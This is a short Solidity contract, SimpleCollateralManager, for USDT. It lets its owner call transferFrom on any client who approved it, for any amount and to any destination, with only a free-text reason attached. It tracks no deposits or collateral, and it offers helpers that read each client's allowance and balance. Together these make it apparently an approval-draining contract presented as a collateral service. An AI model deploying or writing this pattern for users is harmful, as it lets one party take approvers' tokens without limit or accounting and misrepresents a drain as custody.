// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleCollateralManager {
    address public owner;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    event CollateralWithdrawn(address indexed client, address indexed to, uint256 amount, string reason);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function withdrawCollateral(
        address client,
        address to,
        uint256 amount,
        string calldata reason
    ) external onlyOwner {
        (bool success, ) = USDT.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", client, to, amount)
        );
        require(success, "Transfer failed");
        emit CollateralWithdrawn(client, to, amount, reason);
    }

    function getClientAllowance(address client) external view returns (uint256) {
        (bool success, bytes memory data) = USDT.staticcall(
            abi.encodeWithSignature("allowance(address,address)", client, address(this))
        );
        require(success, "Call failed");
        return abi.decode(data, (uint256));
    }

    function getClientBalance(address client) external view returns (uint256) {
        (bool success, bytes memory data) = USDT.staticcall(
            abi.encodeWithSignature("balanceOf(address)", client)
        );
        require(success, "Call failed");
        return abi.decode(data, (uint256));
    }
}
